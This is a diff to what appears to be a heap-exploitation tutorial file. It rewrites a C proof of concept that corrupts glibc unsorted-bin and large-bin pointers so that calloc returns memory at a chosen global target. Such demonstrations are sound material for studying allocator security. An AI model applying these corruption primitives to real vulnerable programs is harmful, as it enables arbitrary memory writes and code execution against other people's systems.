@@ -32,46 +32,49 @@ This attack is particularly notable because it can bypass the lack of a pre-exis
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <assert.h>
 
-char target[0x60]; // Our target allocation
+char target[0x60]; 
 
 int main(){
-    // ... initialization and heap setup ...
-    
-    // 1. Prepare chunks
-    // Put one chunk into unsorted bin and a smaller one into the large bin.
-    // The unsorted bin chunk MUST be larger than the large bin chunk.
-    char *unsorted_bin = malloc(0x4e8); // size 0x4f0
-    malloc(0x18); // barrier
-    char *large_bin = malloc(0x4d8);   // size 0x4e0
-    malloc(0x18); // barrier
+    char *unsorted_bin, *large_bin, *fake_chunk, *ptr;
+	int* tcaches[7];
 
-    free(large_bin);
-    free(unsorted_bin);
-    // Trigger sorting to move large_bin into the large bin
-    malloc(0x4e8); 
-    free(unsorted_bin);
+	unsorted_bin = malloc(0x4e8); 
+	malloc(0x18); 
 
-    // 2. Setup Fake Chunk
-    char *fake_chunk = target - 0x10;
+	int shift_amount = get_shift_amount(unsorted_bin);	
+	size_t alloc_size = ((size_t)unsorted_bin) >> (8 * shift_amount);
+	alloc_size = (alloc_size & 0xFFFFFFFFE) - 0x10; 
 
-    // 3. VULNERABILITY: Corrupt Unsorted Bin BK
-    // This links the target into the unsorted bin.
-    ((size_t *)unsorted_bin)[1] = (size_t)fake_chunk;
+	if(alloc_size < 0x410){
+		for(int i = 0; i < 7; i++) tcaches[i] = malloc(alloc_size);
+		for(int i = 0; i < 7; i++) free(tcaches[i]);
+	}
 
-    // 4. VULNERABILITY: Corrupt Large Bin BK_NEXTSIZE
-    // We misalign the write to create a fake size at the target location.
-    // A heap address will be written to (fake_chunk - 0x18 - shift).
-    // The upper bytes of the heap address will act as the size.
-    ((size_t *)large_bin)[3] = (size_t)fake_chunk - 0x18 - shift_amount;
-    ((size_t *)large_bin)[1] = (size_t)fake_chunk + 8; // Large bin fd
+	large_bin = malloc(0x4d8); 
+	malloc(0x18);
 
-    // 5. Trigger the attack
-    // calloc is used to bypass tcache and trigger unsorted bin processing.
-    void *ptr = calloc(alloc_size, 1);
-    
-    // ptr now points to our target!
-    assert(ptr == target);
+	free(large_bin);
+	free(unsorted_bin);
+
+	// Put large_bin into large bin
+	malloc(0x4e8);
+	free(unsorted_bin);
+
+	fake_chunk = target - 0x10;
+
+	// VULNERABILITY: Unsorted bin attack
+	((size_t *)unsorted_bin)[1] = (size_t)fake_chunk; 
+
+	// VULNERABILITY: Large bin attack to forge size
+	((size_t *)large_bin)[1] = (size_t)fake_chunk + 8; 
+	((size_t *)large_bin)[3] = (size_t)fake_chunk - 0x18 - shift_amount; 
+
+	ptr = calloc(alloc_size, 1);
+	
+	assert(ptr == target);
+	return 0;
 }
 ```
 
